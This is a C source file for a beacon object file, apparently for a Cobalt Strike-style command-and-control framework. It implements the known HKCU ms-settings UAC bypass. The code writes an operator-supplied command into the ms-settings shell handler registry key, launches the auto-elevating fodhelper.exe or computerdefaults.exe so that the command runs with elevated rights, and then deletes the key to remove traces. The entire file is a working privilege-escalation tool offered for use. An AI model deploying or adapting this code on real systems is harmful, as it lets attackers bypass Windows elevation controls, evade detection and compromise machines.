/*
 * bof-uacbypass <command> [fodhelper|computerdefaults]
 *
 * Classic HKCU ms-settings UAC bypass.  Writes
 *   HKCU\Software\Classes\ms-settings\shell\open\command
 * with the payload as the default value and an empty DelegateExecute, then
 * launches the auto-elevating handler.  The registry key is removed after the
 * handler starts, so the payload must be able to complete on its own.
 *
 * Example: bof-uacbypass "cmd.exe /c whoami > C:\Windows\Temp\uac.txt"
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static void launch_handler(const char *method)
{
    char exe[MAX_PATH];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    exe[0] = 0;
    if (bof_stricmp(method, "computerdefaults") == 0)
        bof_strncpy(exe, "C:\\Windows\\System32\\computerdefaults.exe", sizeof(exe));
    else
        bof_strncpy(exe, "C:\\Windows\\System32\\fodhelper.exe", sizeof(exe));

    bof_memzero(&si, sizeof(si));
    bof_memzero(&pi, sizeof(pi));
    si.cb = sizeof(si);
    if (!KERNEL32$CreateProcessA(exe, NULL, NULL, NULL, FALSE,
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcess(%s) failed: %lu\n",
                     exe, (unsigned long)KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] launched %s\n", exe);
    KERNEL32$WaitForSingleObject(pi.hProcess, 6000);
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(pi.hProcess);
}

void go(char *args, int alen)
{
    datap parser;
    char *command, *method = "fodhelper";
    int clen, mlen;
    HKEY key = NULL;
    DWORD disp = 0;
    LONG rc;

    BeaconDataParse(&parser, args, alen);
    command = BeaconDataExtract(&parser, &clen);
    method  = BeaconDataExtract(&parser, &mlen);
    if (!command || !command[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: uacbypass <command> [fodhelper|computerdefaults]\n");
        return;
    }
    if (!method || !method[0]) method = "fodhelper";

    rc = ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Classes\\ms-settings\\shell\\open\\command",
            0, NULL, 0, KEY_WRITE, NULL, &key, &disp);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegCreateKeyEx failed: %lu\n",
                     (unsigned long)rc);
        return;
    }

    rc = ADVAPI32$RegSetValueExA(key, NULL, 0, REG_SZ,
                                 (const BYTE *)command,
                                 (DWORD)bof_strlen(command) + 1);
    if (rc == ERROR_SUCCESS)
        rc = ADVAPI32$RegSetValueExA(key, "DelegateExecute", 0, REG_SZ,
                                     (const BYTE *)"", 1);
    ADVAPI32$RegCloseKey(key);

    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegSetValueEx failed: %lu\n",
                     (unsigned long)rc);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] HKCU ms-settings command set; triggering %s\n", method);
    launch_handler(method);

    KERNEL32$Sleep(2500);
    ADVAPI32$RegDeleteTreeA(HKEY_CURRENT_USER,
                            "Software\\Classes\\ms-settings");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] registry key cleaned up\n");
}
